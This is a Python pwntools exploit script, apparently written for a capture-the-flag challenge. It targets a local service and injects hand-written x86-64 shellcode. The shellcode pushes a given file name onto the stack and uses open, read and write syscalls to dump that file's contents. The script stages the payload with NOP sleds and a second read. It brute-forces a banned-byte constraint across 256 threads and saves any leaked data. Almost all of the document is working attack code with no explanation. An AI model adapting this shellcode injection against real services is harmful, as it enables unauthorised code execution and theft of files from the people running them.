#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import threading
import sys

elf = ""
libc = ""
env = ""
LOCAL = 1
context.arch = "amd64"
context.log_level = "debug"

target = 'H\x8d5\x00\x00\x00\x00H\xc7\xc2\x8d\x00\x00\x00\x0f\x05'
banner = ['\x00', '\xc2', '\x05', '\xc7', 'H', '\x8d', '\x0f', '5']

def pro():

    #p = process("./asg")
    p = remote("127.0.0.1", 9025)
    pid = pidof(p)[0]
    p.recvuntil("bytes?\n")

    p.send("a") #any.
    time.sleep(5)

    p.recvuntil("bytes:\n")

    constraint = p.recv(128)
    for i in banner:
        if i in constraint:

            print "[*]Banned!"
            p.close()
            return 0 

    print "[*]pass!!!!!!!!!!!!!!!!!!!!!!!"
    print p.recvuntil("file: [")
    file_name = p.recvuntil("]")
    file_name = file_name.split("]")[0]
    print file_name
    p.recvuntil("shellcode: ")


    #push file name
    temp = file_name+"\x00"
    temp = temp[::-1]
    pusher = ""
    for i in range(9):

        idx1 = i
        idx2 = i + 1
        part = temp[8 * idx1: 8 * idx2]
        part = part[::-1]
        pusher += "H\xb9" + part + "Q"  



    shell_write = 'H\xc7\xc0\x01\x00\x00\x00H\xc7\xc7\x01\x00\x00\x00H\x89\xe6H\xc7\xc2\x47\x00\x00\x00\x0f\x05'

    open_read_write = "H\xc7\xc0\x02\x00\x00\x00H\x89\xe7H\xc7\xc6\x00\x00\x00\x00\x0f\x05H\x89\xc7H\xc7\xc0\x00\x00\x00\x00H\x89\xe6H\xc7\xc2d\x00\x00\x00\x0f\x05H\xc7\xc0\x01\x00\x00\x00H\xc7\xc7\x01\x00\x00\x00H\x89\xe6H\xc7\xc2d\x00\x00\x00\x0f\x05" 

    writer = pusher + open_read_write
    
    readagain = "H\xc7\xc0\x00\x00\x00\x00H\xc7\xc7\x00\x00\x00\x00H\x8d5\x00\x00\x00\x00H\xc7\xc2\x00\x01\x00\x00\x0f\x05"

    payload1 = target.ljust(1000, "\x00")
    payload2 = "\x90" * 20 + readagain
    payload2 = payload2.ljust(0x8d, "\x90")

    payload3 = "\x90" * 20 + writer
    payload3 = payload3.ljust(0x100,"\x90")
    p.sendline(payload1 + payload2 + payload3)
    time.sleep(10)
    print p.recvuntil("suerte!\n")
    
    data = p.recv(timeout=3)
    if len(data) > 2:
        f = open(str(pid), "wb")
        f.write(data)
        f.close()
    p.close()
    return 0

threads = []
for i in range(256):
    
    task = threading.Thread(target=pro, args=())
    threads.append(task)
for t in threads:
    t.setDaemon(True)
    t.start()
for t in threads:
    t.join()

